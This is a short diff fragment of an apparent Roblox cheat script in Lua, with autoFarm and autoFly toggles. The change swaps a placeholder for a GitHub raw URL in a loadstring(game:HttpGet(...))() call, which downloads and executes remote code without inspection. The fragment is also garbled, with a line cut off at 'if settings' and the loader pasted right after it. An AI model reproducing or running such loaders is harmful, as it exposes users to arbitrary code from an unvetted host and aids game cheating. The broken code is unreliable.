@@ -231,4 +231,4 @@ spawn(function()
         if settings.autoFarm then autoFarm() end
         if settings.autoFly then autoFly() end
         if settings
-loadstring(game:HttpGet("URL_của_script_của_bạn", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tuanKhanh25/Khamh/refs/heads/main/Khanh", true))()
